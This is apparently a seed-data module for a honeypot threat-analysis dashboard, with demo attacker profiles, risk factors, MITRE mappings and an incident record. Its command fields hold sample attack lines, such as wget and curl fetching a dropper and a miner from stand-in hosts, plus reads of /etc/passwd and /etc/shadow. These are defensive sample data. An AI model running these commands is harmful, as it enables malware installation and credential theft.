from __future__ import annotations
from datetime import datetime, timezone, timedelta
import hashlib
from typing import Any, Dict, List
from sqlalchemy import func, select
from sqlalchemy.ext.asyncio import AsyncSession
from app.models import Attacker, Event, MitreMapping, KillChainMapping, Relationship, Incident, Block, Gateway
from app.services.fingerprint import compute_fingerprint

DEMO_ATTACKERS = [
    {
        "ip": "45.33.32.156",
        "risk_score": 92.0,
        "risk_band": "critical",
        "intent": "malware_deployment",
        "status": "blocked",
        "is_repeat": True,
        "honeypots": ["cowrie", "opencanary"],
        "ports": [22, 2222],
        "usernames": ["root", "admin", "service"],
        "passwords": ["toor", "123456", "p@ssw0rd!"],
        "commands": ["whoami", "uname -a", "cat /etc/passwd", "wget http://c2.darknet.ru/drop.sh", "chmod +x drop.sh", "crontab -e"],
        "urls": ["http://c2.darknet.ru/drop.sh"],
        "hashes": ["9e107d9d372bb6826bd81d3542a419d6"],
        "factors": [
            {"factor": "scan", "points": 10, "reason": "Port scanning activity observed"},
            {"factor": "brute_force", "points": 20, "reason": "Brute force login attempts detected"},
            {"factor": "login_success", "points": 20, "reason": "Successful login on honeypot"},
            {"factor": "recon", "points": 10, "reason": "Reconnaissance commands executed"},
            {"factor": "download_upload", "points": 20, "reason": "File transfer activity detected"},
            {"factor": "persistence", "points": 15, "reason": "Persistence mechanism attempt detected"},
            {"factor": "internal_decoy", "points": 25, "reason": "Internal decoy accessed"},
        ],
    },
    {
        "ip": "198.20.69.74",
        "risk_score": 78.0,
        "risk_band": "critical",
        "intent": "credential_theft",
        "status": "active",
        "is_repeat": False,
        "honeypots": ["cowrie"],
        "ports": [22],
        "usernames": ["root", "support", "ubuntu"],
        "passwords": ["root", "alpine", "admin123"],
        "commands": ["whoami", "id", "cat /etc/shadow", "last", "w"],
        "urls": [],
        "hashes": [],
        "factors": [
            {"factor": "scan", "points": 10, "reason": "Port scanning activity observed"},
            {"factor": "brute_force", "points": 20, "reason": "Brute force login attempts detected"},
            {"factor": "login_success", "points": 20, "reason": "Successful login on honeypot"},
            {"factor": "recon", "points": 10, "reason": "Reconnaissance commands executed"},
            {"factor": "internal_decoy", "points": 25, "reason": "Internal decoy accessed"},
        ],
    },
    {
        "ip": "89.248.167.131",
        "risk_score": 65.0,
        "risk_band": "high",
        "intent": "reconnaissance",
        "status": "watchlist",
        "is_repeat": True,
        "honeypots": ["cowrie", "dionaea"],
        "ports": [22, 445],
        "usernames": ["guest", "operator"],
        "passwords": ["operator", "111111"],
        "commands": ["ifconfig", "netstat -an", "route -n", "ps aux"],
        "urls": [],
        "hashes": [],
        "factors": [
            {"factor": "scan", "points": 10, "reason": "Port scanning activity observed"},
            {"factor": "multi_honeypot", "points": 15, "reason": "Attacker touched 2 honeypots"},
            {"factor": "recon", "points": 10, "reason": "Reconnaissance commands executed"},
            {"factor": "login_success", "points": 20, "reason": "Successful login on honeypot"},
            {"factor": "repeat_attacker", "points": 10, "reason": "Known repeat attacker"},
        ],
    },
    {
        "ip": "185.220.101.34",
        "risk_score": 58.0,
        "risk_band": "high",
        "intent": "malware_deployment",
        "status": "watchlist",
        "is_repeat": False,
        "honeypots": ["dionaea"],
        "ports": [445, 139],
        "usernames": [],
        "passwords": [],
        "commands": ["curl http://pastebin.raw/miner.sh -o /tmp/m", "chmod +x /tmp/m"],
        "urls": ["http://pastebin.raw/miner.sh"],
        "hashes": ["e4d909c290d0fb1ca068ffaddf22cbd0"],
        "factors": [
            {"factor": "scan", "points": 10, "reason": "Port scanning activity observed"},
            {"factor": "download_upload", "points": 20, "reason": "File transfer activity"},
            {"factor": "recon", "points": 10, "reason": "Reconnaissance commands executed"},
            {"factor": "anomaly", "points": 10, "reason": "Isolation Forest anomaly detection flagged this attacker"},
        ],
    },
    {
        "ip": "193.32.162.47",
        "risk_score": 45.0,
        "risk_band": "medium",
        "intent": "credential_theft",
        "status": "active",
        "is_repeat": False,
        "honeypots": ["opencanary"],
        "ports": [80, 8080],
        "usernames": ["admin", "test"],
        "passwords": ["admin", "test"],
        "commands": [],
        "urls": [],
        "hashes": [],
        "factors": [
            {"factor": "scan", "points": 10, "reason": "Port scanning activity observed"},
            {"factor": "brute_force", "points": 20, "reason": "Brute force login attempts detected"},
            {"factor": "recon", "points": 10, "reason": "Web reconnaissance"},
        ],
    },
    {
        "ip": "91.108.4.1",
        "risk_score": 35.0,
        "risk_band": "medium",
        "intent": "reconnaissance",
        "status": "active",
        "is_repeat": False,
        "honeypots": ["conpot"],
        "ports": [502, 102],
        "usernames": [],
        "passwords": [],
        "commands": [],
        "urls": [],
        "hashes": [],
        "factors": [
            {"factor": "scan", "points": 10, "reason": "Industrial Modbus/S7 scan"},
            {"factor": "recon", "points": 10, "reason": "PLC memory mapping query"},
            {"factor": "multi_honeypot", "points": 15, "reason": "Cross-network scanning"},
        ],
    },
    {
        "ip": "5.188.87.1",
        "risk_score": 20.0,
        "risk_band": "low",
        "intent": "reconnaissance",
        "status": "active",
        "is_repeat": False,
        "honeypots": ["opencanary"],
        "ports": [21, 23],
        "usernames": ["anonymous"],
        "passwords": ["guest"],
        "commands": [],
        "urls": [],
        "hashes": [],
        "factors": [
            {"factor": "scan", "points": 10, "reason": "Mass scanner probe"},
        ],
    },
    {
        "ip": "176.10.99.200",
        "risk_score": 15.0,
        "risk_band": "low",
        "intent": "reconnaissance",
        "status": "active",
        "is_repeat": False,
        "honeypots": ["cowrie"],
        "ports": [22],
        "usernames": ["test"],
        "passwords": ["test"],
        "commands": [],
        "urls": [],
        "hashes": [],
        "factors": [
            {"factor": "scan", "points": 10, "reason": "SSH banner grabbing"},
        ],
    },
]


async def seed_demo(db: AsyncSession) -> None:
    now = datetime.now(timezone.utc)
    created_attackers: List[Attacker] = []

    for idx, d in enumerate(DEMO_ATTACKERS):
        first_seen = now - timedelta(hours=8, minutes=idx * 35)
        last_seen = now - timedelta(minutes=idx * 7 + 2)

        fp, fv = compute_fingerprint(
            d["commands"],
            d["usernames"],
            d["passwords"],
            [first_seen, last_seen],
        )

        history = [
            {"ts": (first_seen + timedelta(minutes=5)).isoformat(), "score": max(10.0, d["risk_score"] - 40.0), "band": "low"},
            {"ts": (first_seen + timedelta(minutes=25)).isoformat(), "score": max(20.0, d["risk_score"] - 20.0), "band": "medium"},
            {"ts": last_seen.isoformat(), "score": d["risk_score"], "band": d["risk_band"]},
        ]

        attacker = Attacker(
            ip=d["ip"],
            first_seen=first_seen,
            last_seen=last_seen,
            total_events=len(d["commands"]) + len(d["usernames"]) + 12,
            honeypots_touched=d["honeypots"],
            ports=d["ports"],
            usernames=d["usernames"],
            passwords=d["passwords"],
            commands=d["commands"],
            urls=d["urls"],
            hashes=d["hashes"],
            sessions=[f"sess-{idx:03d}"],
            is_repeat=d["is_repeat"],
            status=d["status"],
            fingerprint=fp,
            feature_vector=fv,
            risk_score=d["risk_score"],
            risk_band=d["risk_band"],
            risk_factors=d["factors"],
            risk_history=history,
            intent=d["intent"],
            intent_evidence=[f"Signature indicators for {d['intent']}"],
            is_anomaly=(d["risk_score"] > 55),
            anomaly_score=0.78 if d["risk_score"] > 55 else 0.15,
        )
        db.add(attacker)
        await db.flush()
        created_attackers.append(attacker)

        # Seed realistic events for attacker
        ev_uuid = hashlib.md5(f"{d['ip']}-ev1".encode()).hexdigest()
        event1 = Event(
            event_id=ev_uuid,
            timestamp=first_seen,
            received_at=first_seen,
            honeypot=d["honeypots"][0],
            decoy_type="external",
            src_ip=d["ip"],
            src_port=49210 + idx,
            dst_port=d["ports"][0],
            session_id=f"sess-{idx:03d}",
            event_type="scan" if not d["commands"] else "command",
            username=d["usernames"][0] if d["usernames"] else None,
            command=d["commands"][0] if d["commands"] else None,
            url=d["urls"][0] if d["urls"] else None,
            raw={"proto": "tcp"},
            normalised={"event_type": "scan" if not d["commands"] else "command"},
            attacker_id=attacker.id,
        )
        db.add(event1)

        # MITRE mappings
        if d["risk_score"] >= 60:
            db.add(MitreMapping(
                attacker_id=attacker.id,
                technique_id="T1110",
                technique_name="Brute Force",
                tactic="Credential Access",
                evidence_event_ids=[ev_uuid],
            ))
            db.add(MitreMapping(
                attacker_id=attacker.id,
                technique_id="T1082",
                technique_name="System Information Discovery",
                tactic="Discovery",
                evidence_event_ids=[ev_uuid],
            ))
            db.add(KillChainMapping(
                attacker_id=attacker.id,
                phase="Reconnaissance",
                evidence_event_ids=[ev_uuid],
            ))
            db.add(KillChainMapping(
                attacker_id=attacker.id,
                phase="Delivery",
                evidence_event_ids=[ev_uuid],
            ))
            db.add(KillChainMapping(
                attacker_id=attacker.id,
                phase="Exploitation",
                evidence_event_ids=[ev_uuid],
            ))

    # Add relationships between attackers
    if len(created_attackers) >= 3:
        # Edge 1: shared malware/c2 between attacker 0 and 3
        rel1 = Relationship(
            attacker_a_id=created_attackers[0].id,
            attacker_b_id=created_attackers[2].id,
            rel_type="shared_credentials",
            weight=0.75,
            evidence=["Shared credential patterns (root/toor/admin)", "Consecutive scanning window within 10 min"],
        )
        db.add(rel1)

        # Edge 2: repeat attacker campaign
        rel2 = Relationship(
            attacker_a_id=created_attackers[0].id,
            attacker_b_id=created_attackers[3].id,
            rel_type="shared_malware",
            weight=0.88,
            evidence=["Common automated dropper script structure", "Same payload hosting domain pattern"],
        )
        db.add(rel2)

    # Seed an active block for the top attacker
    top_attacker = created_attackers[0]
    block = Block(
        ip=top_attacker.ip,
        attacker_id=top_attacker.id,
        requested_by="system_auto",
        ttl_seconds=600,
        status="active",
        requested_at=now - timedelta(minutes=5),
        verified_at=now - timedelta(minutes=5),
        expires_at=now + timedelta(minutes=5),
        mock=True,
    )
    db.add(block)

    # Seed an incident for the top attacker
    inc = Incident(
        attacker_id=top_attacker.id,
        title=f"Critical automated compromise: {top_attacker.ip}",
        status="investigating",
        status_history=[
            {"status": "new", "ts": (now - timedelta(minutes=30)).isoformat(), "note": "Auto-escalated by Risk Ladder (Score 92)"},
            {"status": "investigating", "ts": (now - timedelta(minutes=20)).isoformat(), "note": "Assigned to SOC Tier-2"},
        ],
        assignee="analyst-alex",
        notes=[
            {"text": "Attacker performed automated weaponization after SSH breakout.", "ts": (now - timedelta(minutes=15)).isoformat(), "author": "analyst-alex"}
        ],
        root_cause={
            "contributing_events": [top_attacker.ip],
            "factors": ["scan", "brute_force", "login_success", "download_upload", "persistence", "internal_decoy"],
        },
        blast_radius={
            "honeypots": ["cowrie", "opencanary"],
            "ports": [22, 2222],
            "decoys": ["internal", "external"],
            "internal_decoy": True,
        },
        ttd_seconds=34.2,
        ttr_seconds=12.5,
        created_at=now - timedelta(minutes=30),
        updated_at=now - timedelta(minutes=15),
        risk_score_at_creation=92.0,
    )
    db.add(inc)

    await db.flush()


async def seed_gateways_if_needed(db: AsyncSession) -> None:
    now = datetime.now(timezone.utc)
    res = await db.execute(select(func.count(Gateway.id)))
    count = res.scalar_one()
    if count == 0:
        gateways = [
            Gateway(
                id="payment",
                name="Payment Gateway",
                endpoint_prefix="/api/payment",
                owner_team="payments_team",
                status="operational",
                status_history=[{"status": "operational", "timestamp": now.isoformat(), "note": "Initial operational status", "actor": "system"}],
            ),
            Gateway(
                id="auth",
                name="Authentication Gateway",
                endpoint_prefix="/api/auth",
                owner_team="identity_team",
                status="operational",
                status_history=[{"status": "operational", "timestamp": now.isoformat(), "note": "Initial operational status", "actor": "system"}],
            ),
            Gateway(
                id="admin",
                name="Admin Console",
                endpoint_prefix="/admin",
                owner_team="platform_team",
                status="operational",
                status_history=[{"status": "operational", "timestamp": now.isoformat(), "note": "Initial operational status", "actor": "system"}],
            ),
        ]
        for gw in gateways:
            db.add(gw)
        await db.flush()


async def seed_if_needed(db: AsyncSession) -> None:
    await seed_gateways_if_needed(db)
    res = await db.execute(select(func.count(Attacker.id)))
    count = res.scalar_one()
    if count == 0:
        await seed_demo(db)


